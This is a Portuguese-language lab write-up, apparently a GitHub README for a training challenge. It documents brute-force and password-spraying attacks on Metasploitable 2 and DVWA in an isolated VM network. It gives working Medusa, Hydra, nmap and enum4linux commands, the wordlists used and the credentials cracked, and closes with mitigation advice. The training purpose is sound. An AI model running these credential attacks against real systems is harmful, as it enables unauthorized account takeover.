# 🛡️ Simulação de Ataques de Força Bruta, Password Spraying e Resolução de Falsos Positivos em Ambiente Controlado

**Autor:** João Arthur Duarte de Faria  
**Cargo:** Junior Software Engineer (.NET / Node.js) & Game Developer  
**Links:** [LinkedIn](https://www.linkedin.com/in/joao-arthur-duarte/) | [GitHub](https://github.com/Sertoriel)

---

## 📌 Visão Geral do Projeto

Este repositório documenta a execução de um desafio prático de cibersegurança proposto pela **DIO (Digital Innovation One)**. O objetivo deste projeto é aplicar técnicas de _Penetration Testing_ (Pentest) focadas na exploração de falhas de autenticação, englobando ataques de força bruta e _password spraying_ em serviços distintos (FTP, SMB e HTTP).

Mais do que a simples execução de ferramentas, este relatório detalha o processo de **Engenharia Reversa de requisições HTTP**, análise de logs para **resolução de falsos positivos** (pivotagem de ferramentas) e propõe medidas de **mitigação arquiteturais** essenciais para o desenvolvimento de software seguro.

---

## 🏗️ Arquitetura e Setup do Laboratório (Ambiente Seguro)

Para garantir a segurança do ambiente e impedir vazamentos na rede local, a topologia foi configurada em um ambiente estritamente isolado (_sandbox_).

- **Atacante:** Kali Linux (VM)
- **Alvo Vulnerável:** Metasploitable 2 (VM)
- **Hipervisor:** Oracle VirtualBox
- **Isolamento de Rede:** Ambas as máquinas foram configuradas no modo **Rede Exclusiva de Hospedeiro (Host-Only)**, estabelecendo uma rede interna LAN (Sub-rede `192.168.56.0/24`) sem acesso à internet externa.

<p align="center">
  <img src="images/Pasted%20image%2020260410152202.png" alt="Configuração de Rede Host-Only das VMs" width="500">
  <img src="images/Pasted%20image%2020260410152224.png" alt="Configuração de Rede Host-Only das VMs" width="500">
</p>

### Validação de Conectividade

Antes de iniciar os testes, a comunicação entre as máquinas foi validada através do protocolo ICMP (`ping`):

```bash
┌──(sertokali㉿kali-vm)-[~]
└─$ ping -c 3 192.168.56.101
PING 192.168.56.101 (192.168.56.101) 56(84) bytes of data.
64 bytes from 192.168.56.101 : icmp_seq=1 ttl=64 time=1.23 ms
64 bytes from 192.168.56.101 : icmp_seq=2 ttl=64 time=0.740 ms
64 bytes from 192.168.56.101 : icmp_seq=3 ttl=64 time=6.42 ms

--- 192.168.56.101 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2027ms
rtt min/avg/max/mdev = 0.740/2.795/6.420/2.570 ms
```

A resposta com `0% packet loss` confirmou que a máquina alvo estava acessível na rede fechada, permitindo o avanço para a fase de enumeração.

---

## 🔍 Fase 1: Reconhecimento (Information Gathering)

O primeiro passo lógico de um ataque é mapear a superfície de contato do alvo. Utilizei o **Nmap** para varrer portas específicas em busca de serviços ativos e suas respectivas versões.

**Comando Executado:**

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

- `-sV`: Ativa a detecção de versão dos serviços rodando nas portas abertas.
- `-p`: Especifica as portas alvo (FTP, SSH, HTTP e SMB).

**Resultados do Escaneamento:**

```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

Com a confirmação visual de que as portas **21 (FTP)**, **80 (HTTP)** e **139/445 (SMB)** estavam escutando conexões, prossegui com a montagem das Wordlists personalizadas e a execução dos ataques direcionados.

Teste/Tentativa falha de login no FTP:

```Bash
┌──(sertokali㉿kali-vm)-[~]
└─$ ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:sertokali): msfadmin
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp> quit
221 Goodbye.
```

---

## ⚔️ Fase 2: Ataque de Força Bruta Simples (Serviço FTP)

Com o serviço FTP (porta 21) identificado como ativo e rodando a versão `vsftpd 2.3.4`, o objetivo foi testar a resiliência da autenticação através de um ataque de força bruta tradicional.

### 1. Criação das Wordlists Direcionadas

Em vez de utilizar _wordlists_ genéricas e gigantescas que causam excesso de tráfego, optei por criar listas menores, focadas em credenciais padrão de ambientes de desenvolvimento:

```bash
# Criação da lista de usuários
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

# Criação da lista de senhas
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### 2\. Execução com Medusa

Utilizei o **Medusa** devido à sua alta performance e paralelismo (`-t 6` para 6 threads simultâneas) na quebra de protocolos de rede diretos.

**Comando:**

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

**Resultado de Sucesso:**
Após algumas interações, o Medusa identificou uma credencial válida com as senhas correspondendo ao nome de usuário.

```bash
2026-04-10 16:20:34 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

### 3\. Validação de Acesso (Prova de Conceito)

Para confirmar a vulnerabilidade, realizei o login manual via terminal utilizando as credenciais obtidas, garantindo acesso direto ao sistema de arquivos do servidor.

<p align="center">
<img src="images/Pasted image 20260410163249.png" alt="Configuração de Rede Host-Only das VMs" width="500">
</p>

---

## 🌐 Fase 3: Ataque Web (DVWA) e Resolução de Desafios Técnicos

O próximo alvo foi a aplicação web vulnerável **DVWA (Damn Vulnerable Web App)**, rodando na porta 80. Diferente de protocolos de rede simples como o FTP, formulários HTTP requerem uma engenharia reversa básica antes do ataque.

### 1\. Interceptação de Requisição (Engenharia Reversa)

Realizei uma tentativa de login falha no navegador e utilizei a aba _Network_ do **Developer Tools (F12)** para interceptar o método HTTP.

Descobri que o sistema utiliza o método `POST` enviando as variáveis: `username`, `password` e `Login`. A mensagem de erro retornada no HTML da página era `"Login failed"`.

<p align="center">
<img src="images/Pasted image 20260413142905.png" alt="Configuração de Rede Host-Only das VMs" width="500">
<img src="images/Pasted image 20260413172708.png" alt="Configuração de Rede Host-Only das VMs" width="500">
</p>

### 2\. O Desafio: Falsos Positivos e Limitações do Medusa

Minha primeira tentativa de ataque foi utilizando o módulo `web-form` do Medusa. No entanto, o comportamento da aplicação DVWA causou falhas de interpretação na ferramenta.

Ao receber credenciais incorretas, o servidor PHP do DVWA não devolvia um erro `200 OK` com a página falha imediatamente. Em vez disso, ele respondia com um **código HTTP 302 (Redirect)**, forçando o navegador a recarregar a página por meio de um método `GET` para então exibir a mensagem `"Login failed"`.

O Medusa não foi projetado para seguir redirecionamentos complexos, resultando em múltiplos falsos positivos e erros de método (`Invalid method` e `error code 302`).

Exemplo de um falso positivo:

**User: user** /
**Password: 123456**

<p align="center">
<img src="images/Pasted image 20260413172653.png" alt="Configuração de Rede Host-Only das VMs" width="900">
</p>

#### Esses são todos os falsos positivos que o Medusa retornou:

```bash
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-04-13 14:15:22 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
2026-04-13 14:15:22 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: 123456 [SUCCESS]
2026-04-13 14:15:22 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 2 complete) Password: 123456 (1 of 4 complete)
2026-04-13 14:15:22 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: 123456 [SUCCESS]
2026-04-13 14:15:22 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (1 of 4 complete)
2026-04-13 14:15:22 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: 123456 [SUCCESS]
2026-04-13 14:15:22 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2026-04-13 14:15:22 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: 123456 [SUCCESS]
2026-04-13 14:15:22 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
2026-04-13 14:15:22 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: password [SUCCESS]
2026-04-13 14:15:22 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 6 complete) Password: password (2 of 4 complete)
2026-04-13 14:15:22 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: password [SUCCESS]
2026-04-13 14:15:22 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 7 complete) Password: qwerty (3 of 4 complete)
2026-04-13 14:15:22 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: qwerty [SUCCESS]
2026-04-13 14:15:22 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 8 complete) Password: password (2 of 4 complete)
2026-04-13 14:15:22 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: password [SUCCESS]
2026-04-13 14:15:22 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 9 complete) Password: msfadmin (4 of 4 complete)
2026-04-13 14:15:22 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: msfadmin [SUCCESS]
```

### 3\. Pivotagem de Ferramenta: A Solução com Hydra

Na cibersegurança, a flexibilidade é crucial. Ao identificar a limitação arquitetural do Medusa para o protocolo HTTP moderno, pivotei o ataque para o **THC-Hydra**, que possui suporte robusto para gerenciamento de cookies e redirecionamentos `302`.

**Comando Corrigido (Hydra):**

```bash
hydra -t 6 -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

_A estrutura do comando informa o caminho, injeta as variáveis no POST e define a string de falha que o Hydra deve procurar após o redirecionamento._

**Resultado do Ataque Web:**
O Hydra processou as requisições perfeitamente e quebrou a autenticação web.

```bash
[DATA] attacking http-post-form://192.168.56.101:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
[80][http-post-form] host: 192.168.56.101   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

---

## 🗄️ Fase 4: Enumeração e Password Spraying (Serviço SMB)

Para simular um cenário de violação de rede interna (movimentação lateral), o foco voltou-se para a porta 139/445 (Samba/SMB). O objetivo foi enumerar utilizadores válidos no sistema e aplicar um ataque de _Password Spraying_ para evitar bloqueios de conta (_Account Lockouts_).

### 1. Enumeração de Utilizadores (Enum4Linux)

Antes de realizar qualquer tentativa de autenticação, é necessário mapear os utilizadores existentes. A ferramenta `enum4linux` foi utilizada para explorar o protocolo SMB via sessões nulas (Null Sessions).

**Comando:**

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

A varredura retornou uma lista extensa de utilizadores locais e de domínio. Para o ataque, selecionei três alvos principais identificados no sistema: `user`, `service` e `msfadmin`.

### 2. Preparação do Password Spraying

O conceito de _Password Spraying_ consiste em testar um número reduzido de senhas comuns contra múltiplos utilizadores.

```bash
# Wordlist de Utilizadores Alvo
echo -e "user\nservice\nmsfadmin" > smb_users.txt

# Wordlist de Senhas (utilizando Heredoc para melhor formatação)
cat << EOF > senhas_spray.txt
password
123456
Welcome123
msfadmin
admin
qwerty
root
EOF
```

### 3. Execução do Ataque

Utilizando novamente o **Medusa**, agora com o módulo `smbnt`, o ataque foi lançado de forma cadenciada.

**Comando:**

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2
```

**Resultado (O "Jackpot"):**
O Medusa iterou silenciosamente pelos utilizadores até encontrar não apenas uma credencial válida, mas uma que concedia privilégios administrativos.

```bash
2026-04-13 17:09:41 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

### 4. Validação e Impacto

Para comprovar o impacto crítico desta falha, utilizei o utilitário `smbclient` para listar os diretórios partilhados com a credencial obtida:

```bash
smbclient -L //192.168.56.101 -U msfadmin
```

O acesso aos partilhamentos `IPC$` e `ADMIN$` confirmou que a conta possui privilégios que permitiriam a execução remota de comandos ou o comprometimento total do sistema de ficheiros.

```Bash
┌──(sertokali㉿kali-vm)-[~]
└─$ smbclient -L //192.168.56.101 -U msfadmin
Password for [WORKGROUP\msfadmin]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE
┌──(sertokali㉿kali-vm)-[~]
└─$
```

---

## 🛡️ Recomendações de Mitigação e Arquitetura Segura

A exploração bem-sucedida destes três vetores de ataque evidencia falhas clássicas de configuração. Como Engenheiro de Software, recomendo a implementação das seguintes medidas defensivas nas camadas de infraestrutura e aplicação:

1. **Mitigação para FTP (Força Bruta Reta):**
   - **Implementação do Fail2Ban:** Configurar o bloqueio automático de endereços IP após `X` tentativas consecutivas de falha de login.
   - **Desativação de Protocolos em Texto Limpo:** O FTP tradicional não possui criptografia. Deve ser substituído por **SFTP** ou **FTPS**, aliados à autenticação por chaves assimétricas em vez de senhas.

2. **Mitigação para Aplicações Web (DVWA):**
   - **Rate Limiting e CAPTCHA:** Limitar a taxa de requisições `POST` no formulário de login por sessão/IP e implementar verificações de Turing (CAPTCHA) após a primeira falha.
   - **Políticas de Senhas Fortes:** Garantir no _back-end_ a exigência de complexidade (tamanho mínimo, caracteres especiais e números).

3. **Mitigação para SMB (Password Spraying e Enumeração):**
   - **Bloqueio de Null Sessions:** Desativar a capacidade de utilizadores anónimos enumerarem informações do sistema (configuração `restrict anonymous = 2` no Samba ou via GPO no Windows).
   - **Princípio do Menor Privilégio:** Contas de serviço não devem ter acessos administrativos (`ADMIN$`).

---

## 📚 Referências e Ferramentas Utilizadas

A execução deste laboratório foi fundamentada em documentação técnica oficial:

- [Kali Linux Official Documentation](https://www.kali.org/docs/)
- [Nmap Network Scanning Book](https://nmap.org/book/)
- [Medusa Parallel Network Login Auditor](http://foofus.net/goons/jmk/medusa/medusa.html)
- [Metasploitable 2 Documentation (Rapid7)](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [Metasploitable 2 Download (SourceForge)](https://sourceforge.net/projects/metasploitable/)

---

## 👨‍💻 Sobre o Autor

**João Arthur Duarte de Faria** _Software Engineer (.NET / Node.js) & Game Developer_ Conecte-se comigo e acompanhe o desenvolvimento de arquiteturas de software seguras e outros projetos:

- 💼 **LinkedIn:** [João Arthur Duarte](https://www.linkedin.com/in/joao-arthur-duarte/)
- 💻 **GitHub:** [Sertoriel](https://github.com/Sertoriel)

---
